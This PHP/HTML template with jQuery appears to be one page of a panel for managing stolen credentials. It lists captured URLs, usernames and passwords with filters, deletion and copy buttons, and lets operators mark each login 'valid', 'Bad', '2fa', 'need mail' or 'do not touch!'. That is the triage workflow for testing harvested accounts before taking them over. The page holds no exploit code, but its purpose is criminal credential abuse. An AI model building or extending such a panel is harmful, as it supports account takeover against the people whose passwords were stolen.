<?php if(!defined("ACCESS")){exit();}?>
<script type="text/javascript">
function viewdiv(id,e){
	var el=document.getElementById(id);
	if(el.style.display=="block"){
		el.style.display="none";
	} else {
		el.style.display="block";
		this.innerHTML="Скрыть";
	}
	//return false;
}

function CopyToClipboard (containerid) {
  var textarea = document.createElement('textarea');
  textarea.id = 'temp_element';
  textarea.style.height = 0;
  document.body.appendChild(textarea);
  textarea.value = document.getElementById(containerid).innerText;
  var selector = document.querySelector('#temp_element');
  selector.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
}

function change_tooltip(containerid){
	var a = document.getElementById(containerid);
	a.dataset.tooltip = "Copied!";
	setTimeout(function(){ 
        a.dataset.tooltip = "Click to copy";
    }, 3000);  
}

$(window).scroll(function() {
  sessionStorage.scrollTop = $(this).scrollTop();
});

$(document).ready(function() {
  if (sessionStorage.scrollTop != "undefined") {
    $(window).scrollTop(sessionStorage.scrollTop);
  }
});

function delete_password(id) {
	var tr = document.getElementById("tr" + id);
	$.ajax({
        url:"./?p=passwords&action=deletepwd&pid=" + id,
        type: "GET",
        success:function(result){
			tr.style.display = 'none';
       }
     });
 }
 
 
function change_pwd_status(id){
		var tr = document.getElementById("tr" + id);
		var select = document.getElementById("select" + id);
		var div = document.getElementById("editstatus" + id);
		
		
		var span_start_bad = '<span style=\'font-weight:bold; color:#660000\'>';
		var span_start_good = '<span style=\'font-weight:bold; color:#004d00\'>';
		var span_start_donottouch = '<span style=\'font-weight:bold;\'>';
		var span_end = '</span>';
		
		
		strNewstatus = select.options[select.selectedIndex].value;
	$.ajax({
        url:"./?p=passwords&action=changepwdstatus&pid=" + id,
        type: "POST",
		data: {'passwd_status':strNewstatus},
        success:function(result){
			viewdiv("editstatus" + id);
			viewdiv("showstatus" + id);
			
			if(strNewstatus =='1'){
				//not checked
				document.getElementById("showstatus" + id).innerHTML='not checked';
				tr.className = '';
			}else if(strNewstatus =='2'){
				//not valid + back
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ Bad ]' + span_end;
				tr.className = 'markednotvalidtr';
			}else if(strNewstatus =='3'){
				//valid + back
				document.getElementById("showstatus" + id).innerHTML= span_start_good +'[ Good ]' + span_end;
				tr.className = 'markedvalidtr';
			}else if(strNewstatus =='4'){
				// do not touch + back
				document.getElementById("showstatus" + id).innerHTML= span_start_donottouch + '[ Do not touch! ]' + span_end;
				tr.className = 'markedtr';
			}else if(strNewstatus =='5'){
				// 2fa
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ 2fa ]' + span_end;
				tr.className = '';
			}else if(strNewstatus =='6'){
				//404
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ 404 ]' + span_end;
				tr.className = '';
			}else if(strNewstatus =='7'){
				//need mail
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ need mail ]' + span_end;
				tr.className = '';
			}
       }
     });
}
</script>
<div style="padding:15px"><i class="fas fa-filter"></i> Filter <span onclick="viewdiv('filter');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>  
	<div id="filter" style="display:none;">
	<form action="" method="post">
	<input type="hidden" name="filter" value="1337">
	<table border=0>
		<tr>
			<td>URL:</td>
			<td><input name='url' placeholder="google.com" type="text"></td>
		</tr>		
		<tr>
			<td>Username:</td>
			<td><input type="text" name="username" placeholder="Admin"></td>
		</tr>
		<tr>
			<td>Password:</td>
			<td><input type="text" name="password" placeholder="qwerty"></td>
		</tr>
		<tr>
			<td>Status:</td>
			<td>
			<label><input type="checkbox" name="passwd_status[notcheck]" value='on'checked>not checked</label><br>
			<label><input type="checkbox" name="passwd_status[notvalid]"  value='on' checked>not valid</label><br>
			<label><input type="checkbox" name="passwd_status[valid]"  value='on'checked>valid</label><br>
			<label><input type="checkbox" name="passwd_status[vip]"  value='on'checked>do not touch!</label><br>
			<label><input type="checkbox" name="passwd_status[2fa]"  value='on'checked>2fa</label><br>
			<label><input type="checkbox" name="passwd_status[404]"  value='on'checked>404</label><br>
			<label><input type="checkbox" name="passwd_status[mail]"  value='on'checked>need mail</label><br>
			</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td><input type=submit value="Filter"></td>
		</tr>
		</table>	
				
			</td>
		</tr>
		<tr>
		</tr>
	</table>
	</form>
	</div>
</div>

<div style='margin:0 auto; text-align:center;padding:10px;overflow:hidden'>
	<?php change_on_page($_SESSION['passwd_onpage']); ?>
	<?php pagination($total, $page_num, $page);?>
</div>

<?php template_show_passwords_table($result, $first+1);?>

<div style='margin:0 auto; text-align:center;padding:10px;overflow:hidden'>
	<?php pagination($total, $page_num, $page);?>
</div>
